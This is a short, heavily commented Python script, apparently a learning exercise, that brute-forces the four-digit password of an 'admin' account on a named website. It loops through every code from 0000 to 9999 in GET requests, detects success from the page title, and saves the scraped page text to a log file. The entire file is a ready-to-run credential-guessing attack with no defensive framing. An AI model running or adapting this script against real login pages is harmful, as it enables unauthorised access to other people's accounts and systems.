# Import the BeautifulSoup and requests libraries
import requests
from bs4 import BeautifulSoup

for num in range(10000):  # Iterate through numbers from 0 to 9999
    passcode = str(num).zfill(4)   # Format the number as a 4-digit string with leading zeros using zfill(4) to add the aforementioned 4 leading zeros, this way it does not just start at 0 and miss some possible passwords such as 0000 or 0001. str method used to make the number a string and then store it in a variable called passcode.
    URL = f"http://www.cyforsec.co.uk/index.php?uname=admin&password={passcode}"  # Construct the URL with the current passcode passed into string as the value of password
    page = requests.get(URL)  # Send a GET request to the URL and stor that in a variable called page

    soup = BeautifulSoup(page.content, "html.parser")  # Parse the HTML content using BeautifulSoup
    title = soup.find("title").getText()  # Extract the text content of the <title> tag and store that in a variable aptly named title
    print(f"Attempted password: {passcode}. Title: {title}")  # print the current number attempted as the password and the current title to show that the current number is invalid as the title has not changed
    if title == "Login Succesful":  # if the title shows 'Login Succesful' then the password/passcode is correct, thus go to the next line
        print(f"The password for the user named admin is: {passcode}")  # display the correct password
        scrapedContentIntoLogs = open("logs.txt", "w")  # Open the logs.txt file to write the scraped content into it
        scrapedContentIntoLogs.write(soup.find("p").getText())  # Write the text content of the <p> tag to the variable that holds the logs.txt file
        scrapedContentIntoLogs.close()  # close the file and the changes are saved
        break  # break out the loop since the password is found
